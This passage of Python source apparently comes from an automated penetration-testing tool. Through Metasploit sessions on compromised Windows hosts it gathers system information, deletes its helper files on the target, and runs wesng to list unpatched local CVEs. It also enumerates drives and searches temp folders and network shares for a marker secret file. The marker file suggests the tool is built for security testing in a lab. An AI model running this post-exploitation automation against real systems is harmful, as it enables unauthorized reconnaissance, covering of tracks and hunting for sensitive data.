    self.mlogger.writelog(client.sessions.session(session_num).read(), "info")
  
    client.sessions.session(session_num).write('download systeminfo.txt')
    time.sleep(20)
    #print(client.sessions.session(session_num).read())
    self.mlogger.writelog(client.sessions.session(session_num).read(), "info")
  
    client.sessions.session(session_num).write('rm systeminfo.txt systeminfo.bat')
    time.sleep(20)
    #print(client.sessions.session(session_num).read())
    self.mlogger.writelog(client.sessions.session(session_num).read(), "info")

    try:
      result = subprocess.check_output('python3 ../wesng/wes.py --definitions ../wesng/definitions.zip -d --muc-lookup systeminfo.txt | grep -e \"Installed hotfixes\" -e \"CVE\" | sort -u', shell=True).decode('utf-8')
      print(result)
      self.mlogger.writelog("wes.py result = " + result, "info")

    except:
      print("wes.py error!!")
      self.mlogger.writelog("wes.py error!!", "error")

    rows = result.splitlines()

    os_patch_list = []
    local_vuln_list = []

    pattern = '(.*): (.*).*'

    for row in rows:
      if 'Installed hotfixes' in row:
        result = re.match(pattern, row)
        os_patch_str = result.group(2).replace('\n', '')
        os_patch_list = [x.strip() for x in os_patch_str.split(',')]
        break
      else:
        pass

    print("os_patch_list = {}".format(os_patch_list))
    self.mlogger.writelog("os_patch_list = " + pprint.pformat(os_patch_list), "info")
    node[num]['os_patches'] = copy.deepcopy(os_patch_list)

    pattern = 'CVE: (.*).*'

    for row in rows:
      if 'CVE' in row:
        result = re.match(pattern, row)
        local_vuln_list.append(result.group(1).replace('\n', ''))
      else:
        pass

    print("local_vuln_list = {}".format(local_vuln_list))
    self.mlogger.writelog("local_vuln_list = " + pprint.pformat(local_vuln_list), "info")
    node[num]['local_vuln_list'] = copy.deepcopy(local_vuln_list)
    
    os_patch_list.clear()
    local_vuln_list.clear()


  def execute_getmaindrvinfo(self, num, node):
    client = self.msf_connection()

    session_num = node[num]['session']

    print("execute get maindrvinfo..")
    self.mlogger.writelog("execute get maindrvinfo...", "info")
    
    client.sessions.session(session_num).write('show_mount')
    time.sleep(10)
    result = client.sessions.session(session_num).read()
    self.mlogger.writelog(result, "info")

    rows = result.splitlines()
    print(rows)

    local_drv = []
    flag = 0

    for row in rows:
      if flag == 1 and '.' not in row.lower():
        break
      if flag == 1:
        c = row.split()
        local_drv.append(c[0])
        local_drv.append(c[1])
      if '----' in row:
        flag = 1

    flag = 0
    
    print("local drive = {}".format(local_drv))
    self.mlogger.writelog("local drive = " + pprint.pformat(local_drv), "info")
    node[num]['local_drive'] = copy.deepcopy(local_drv)

    local_drv.clear()


  def execute_getlocalsecretinfo(self, num, node):
    client = self.msf_connection()

    session_num = node[num]['session']

    print("execute get localsecretinfo...")
    self.mlogger.writelog("execute get localsecretinfo...", "info")
    
    client.sessions.session(session_num).write('pwd')
    time.sleep(10)
    #print(client.sessions.session(session_num).read())
    self.mlogger.writelog(client.sessions.session(session_num).read(), "info")

    client.sessions.session(session_num).write('cd %temp%')
    time.sleep(10)
    #print(client.sessions.session(session_num).read())
    self.mlogger.writelog(client.sessions.session(session_num).read(), "info")

    client.sessions.session(session_num).write('dir')
    time.sleep(10)
    result = client.sessions.session(session_num).read()
    self.mlogger.writelog(result, "info")

    rows = result.splitlines()
    print(rows)

    secret_data = -1

    for row in rows:
      if "mushikago_secret" in row:
        print("find secret_data = {}".format(row))
        secret_data = 1
        break
      else:
        pass
    
    print("secret_data = {}".format(secret_data))
    self.mlogger.writelog("secret_data = " + str(secret_data), "info")
    node[num]['secret_data'] = secret_data

    return secret_data


  def execute_getnwsecretinfo(self, num, node):
    client = self.msf_connection()

    session_num = node[num]['session']

    #print("execute systeminfo..")

    value = iter(node[num]["network_drive"])

    secret_data = -1


    for nwdrv, drv_type in zip(value, value):
      client.sessions.session(session_num).write('pwd')
      time.sleep(10)
      print(client.sessions.session(session_num).read())

      client.sessions.session(session_num).write('cd ' + nwdrv)
      time.sleep(10)
      print(client.sessions.session(session_num).read())

      client.sessions.session(session_num).write('dir')
      time.sleep(10)
      result = client.sessions.session(session_num).read()

      rows = result.splitlines()
      print(rows)

      for row in rows:
        if "mushikago_secret" in row:
          print("find secret_data = {}".format(row))
          secret_data = 1
          break
      else:
        continue
      break
    
    print("secret_data = {}".format(secret_data))
    node[num]['secret_data'] = secret_data

    return secret_data

